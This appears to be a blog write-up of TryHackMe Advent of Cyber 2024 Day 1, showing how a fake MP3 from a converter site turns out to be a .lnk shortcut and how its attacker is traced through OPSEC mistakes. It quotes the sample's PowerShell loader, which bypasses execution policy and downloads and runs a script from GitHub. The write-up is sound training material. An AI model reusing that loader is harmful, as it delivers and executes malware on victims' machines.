---
layout: "post"
title: "Tryhackme-AOC2024-Day1"
categories: [AOC2024]
tags: [TryHackMe, write-ups, AOC2024]

---

![](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*0WHeRElCAfyjjCDXapEQKw.png)

The first day of the **Advent of Cyber 2024** challenges introduces us to key concepts in **digital forensics** and **operational security (OPSEC)**. We investigated a suspicious website that claimed to be a YouTube-to-MP3 converter, uncovering hidden malware and tracing the digital footprints of the threat actor, **M.M.**

Let’s walk through the challenge step-by-step and explore the **tools, techniques**, and **lessons learned** during this exercise.

# Challenge Summary

The task was to analyze a website suspected of hosting malicious files. The investigation required us to:

1. Identify a malicious file masquerading as a song download.
2. Uncover a PowerShell script that sent stolen data to a **Command & Control (C2)** server.
3. Trace the attacker’s **identity** through poor OPSEC practices.

This exercise demonstrated how cybercriminals can leave behind **digital breadcrumbs** and how investigators can connect these clues to uncover the truth.

# Learning Objectives

1. Learn how to investigate suspicious files using **file analysis** tools.
2. Understand **OPSEC** mistakes and their consequences.
3. Attribute malicious activity by correlating **digital artifacts**.

# Introduction to OPSEC

**Operational Security (OPSEC)** originated as a military concept designed to protect classified data from adversaries. In cybersecurity, OPSEC focuses on preventing the exposure of sensitive information that could be exploited.

A security professional must adopt an **operational security mindset**. After all, if we don’t practice OPSEC in our daily lives, we can’t hope to secure an organization’s IT environment.

I’ve previously written a blog on maintaining strong **cybersecurity hygiene** through practical steps like:

- Using **strong, unique passwords**
- Enabling **2FA** (Two-Factor Authentication)
- Regular **software updates**
- Using **anti-virus software** and **VPNs**
- Limiting personal information sharing online

You can check out the full blog [here](https://medium.com/@dharmatejak73/security-hygiene-for-everyone-73eb39083c5e).

# Step-by-Step Walkthrough

## **1. Investigating the Suspicious Website**

   The challenge provided a shady YouTube-to-MP3 converter website. After downloading a “song” file from this site, I unzipped the folder and found two files instead of one.

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*uI03VZXtK0pFuplxFmIk-w.png)
![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*3MpH8jX6p0jigG-04NpJ_w.png)

## **2. Inspecting the File**

Using the `file` command on Linux, I discovered that the **somg.mp3** file was actually a **.lnk file** (a Windows shortcut file):

```
file somg.mp3
```
![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*SiQ8DI4FvaHVS6nU_RAHxA.png)

**What are .lnk files?**

- `.lnk` files are Windows shortcuts that point to other files, folders, or applications.
- Attackers often use them to execute malicious commands or scripts.

## **3. Extracting Metadata with ExifTool**

I used **ExifTool** to extract metadata from the `somg.mp3` file:

```
exiftool somg.mp3
```

The output revealed a **PowerShell command** hidden in the file metadata. Let’s break it down:

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*qEaN4i-ok6bKe1ZeCwGyUg.png)

```
powershell -ep bypass -nop -c "iex (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1', 'C:\ProgramData\IS.ps1')"
```

- **`ep bypass -nop`**: These flags disable PowerShell execution restrictions, allowing scripts to run silently.
- **`DownloadFile`**: Downloads a script (`IS.ps1`) from a remote server.
- **`iex`**: Executes the downloaded PowerShell script.

## **4. Analyzing the PowerShell Script**

The PowerShell script was hosted on a **GitHub repository**. Upon inspecting the script, I noticed a banner stating:

> “Created by the one and only M.M.”

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*1_4zynRv-tiddgt0T9fkvw.png)

This clue led me to investigate the author **M.M.** further.

## **5 Tracing the Attacker (OPSEC Failure)**

Using GitHub’s search functionality, I searched for the banner’s title. The results pointed to a repository where the attacker, **M.M.**, had made a critical OPSEC mistake:

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*Y3Yk4N2usnr_4V-wKW8U4Q.png)

- In the repository’s **README.md** file, **M.M.** included their **real name**.
- This allowed me to identify the attacker and confirm their identity.

This is a classic example of an **OPSEC failure** — a minor oversight that exposed the attacker’s true identity.

# **Key Takeaways: OPSEC Lessons Learned**

The mistakes made by **M.M.** underscore the importance of operational security:

- **Avoid reusing names, emails, or banners** that link your activities across platforms.
- Sensitive files, such as PowerShell scripts, should never contain personal identifiers.
- Cybercriminals often leave digital footprints without realizing it.

Real-world examples like **AlphaBay Admin Takedown** and **APT1 OPSEC failures** show how these mistakes can lead to arrests and attribution.

# **Day 1 Challenge Answers**

**1. Who is the author of the song?**

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*kWHMNdeQci2CbCgdyrIWIA.png)

**2. What is the URL of the C2 server?**
![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*GAA8PONAIwvi6m5U1apjew.png)

**3. Who is M.M.? Maybe his GitHub profile page would provide clues.**

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*Y3Yk4N2usnr_4V-wKW8U4Q.png)

**4. What is the number of commits on the GitHub repo where the issue was raised?**

![](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*K6_kJvrB5ZcXJW5GauUJEQ.png)

# **Conclusion**

Day 1 of the **Advent of Cyber 2024** challenge offered a great introduction to analyzing malicious files, identifying OPSEC failures, and tracking threat actors. By following **methodical investigative steps** and leveraging tools like **ExifTool**, we can uncover hidden evidence and draw meaningful conclusions.

This challenge not only sharpened my technical skills but also reinforced the importance of **operational security** in both offensive and defensive cybersecurity.

Stay tuned for Day 2 as we continue this exciting journey of learning and discovery!
